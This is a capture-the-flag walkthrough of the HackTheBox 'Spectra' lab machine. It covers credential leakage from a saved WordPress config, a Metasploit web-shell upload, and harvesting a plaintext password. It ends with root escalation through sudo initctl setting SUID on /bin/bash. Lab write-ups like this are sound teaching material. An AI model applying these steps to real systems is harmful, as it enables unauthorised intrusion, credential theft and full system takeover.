### Enumeration

After running nmap scan for this machine, we found that it has 2 opening ports `22,80`
Add `spectra.htb` domain name to file `/etc/hosts`
Vist `spectra.htb` domain name and walk around the website, find that there is one user is posting on the website with username `adminstrator`

Running `gobuster` for directory enumeration:
```
gobuster dir -u http://spectra.htb
```

Gobuster found 2 interesting directories: `/main` and `/testing`
Go to `http://spectra.htb/testing` , see that we are reading the page source code. Found file `wp-config.php.save` with this information

```
define( 'DB_NAME', 'dev' );

/** MySQL database username */
define( 'DB_USER', 'devtest' );

/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

Try couples of creds on login page

```
dev:devteam01
administrator: devtest01
```
=> We are able to login to wp-admin with creds `administrator: devtest01`

### Exploitation

After login to wp-admin, we use metasploit with module `wp_admin_web_shell` to upload a reverse shell payload wrapped in a wordpress plugin to gain access to the machine

```
msfconsole
msf6 > use wp_admin_web_shell
***SET OPTIONS***
msf6 > exploit
```
We got a reverse shell back to our machine after running msf exploit, time to look around for interesting files and user


```
nginx@spectra.htb $ cat /etc/passwd

katie:x:20156:20157::/home/katie:/bin/bash
chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
chronos-access:!:1001:1001:non-chronos user with access to chronos data:/dev/null:/bin/false
```

Found another database config in `/mnt` directory:

```
/** The name of the database for WordPress */
define( 'DB_NAME', 'dev' );

/** MySQL database username */
define( 'DB_USER', 'dev' );

/** MySQL database password */
define( 'DB_PASSWORD', 'development01' );
```

But `mysql` login creds is not working on the machine, so we have to try to look for something else
Head back to nginx's user root directory, type `find .` 
=> Found an interesting file `autorun` and `/etc/autologin`

Found in: `/etc/autologin` a password, potentialy for 2 users we knew from above
```
password: katie:SummerHereWeCome!!
```

`ssh katie@10.10.10.229`
We gain access to the machine with `katie` user, we can capture the flag `user.txt` there

### Post Exploitation
We cannot run some Linux local enumeration tools like `LinEnum.sh` or `linpeas.sh` so we have to manually enum.

`sudo -l` show us that we can run `/etc/initctl` as root

=> We can exploit this for privilege escalation

Modify `/etc/test.conf` file to enable SUID for /bin/bash

```
script:
  chmod +s /bin/bash
```
And then start `test.conf` 
```
sudo /etc/initctl start test
```

Check our `/bin/bash` permission

```
/bin/bash -p
bash $ whoami
root
```

=> We got root user, we can capture the root flag at `/root` folder
